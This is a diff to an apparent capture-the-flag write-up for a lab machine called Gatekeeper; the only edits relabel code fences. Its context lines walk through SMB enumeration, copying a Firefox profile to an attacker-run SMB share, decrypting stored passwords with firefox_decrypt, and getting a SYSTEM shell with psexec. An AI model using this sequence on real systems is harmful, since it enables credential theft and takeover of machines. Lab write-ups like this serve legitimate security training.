@@ -15,7 +15,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -Pn -T4 --min-rate 1000 -p- 10.10.249.16 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 00:47 CET
 Nmap scan report for 10.10.249.16
@@ -69,7 +69,7 @@ Nmap done: 1 IP address (1 host up) scanned in 195.76 seconds
 If we input a large number of `A`s, it crashes, indicating this is a buffer overflow machine.
 We need to retrieve the program, so let's try accessing SMB shares without credentials.
 
-```bash
+```shell
 $ smbclient --no-pass -L //10.10.249.16          
 Password for [WORKGROUP\kali]:
 
@@ -119,13 +119,13 @@ On Kali, create an SMB share with `impacket-smbserver -smb2support -user 'test' 
 
 Copy the profile folder to Kali:
 
-```bash
+```shell
 copy lfjfn812a.default-release z:\
 ```
 
 Next, install [`firefox_decrypt`](https://github.com/unode/firefox_decrypt):
 
-```bash
+```shell
 git clone https://github.com/unode/firefox_decrypt.git
                                                                                                   
 python3 firefox_decrypt.py /home/kali
@@ -139,7 +139,7 @@ Password: '8CL7O1N78MdrCIsV'
 
 With these credentials, we try `nxc`:
 
-```bash
+```shell
 nxc smb 10.10.92.113 -u 'mayor' -p '8CL7O1N78MdrCIsV'
 SMB         10.10.92.113    445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
 SMB         10.10.92.113    445    GATEKEEPER       [+] gatekeeper\mayor:8CL7O1N78MdrCIsV (Pwn3d!)
@@ -147,7 +147,7 @@ SMB         10.10.92.113    445    GATEKEEPER       [+] gatekeeper\mayor:8CL7O1N
 
 Using `impacket-psexec`:
 
-```bash
+```shell
 $ impacket-psexec 'mayor':'8CL7O1N78MdrCIsV'@10.10.92.113 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -167,7 +167,7 @@ nt authority\system
 
 ## Post Exploitation
 
-```bash
+```shell
 C:\Windows\system32> cd C:\Users\mayor\desktop
  
 C:\Users\mayor\Desktop> dir
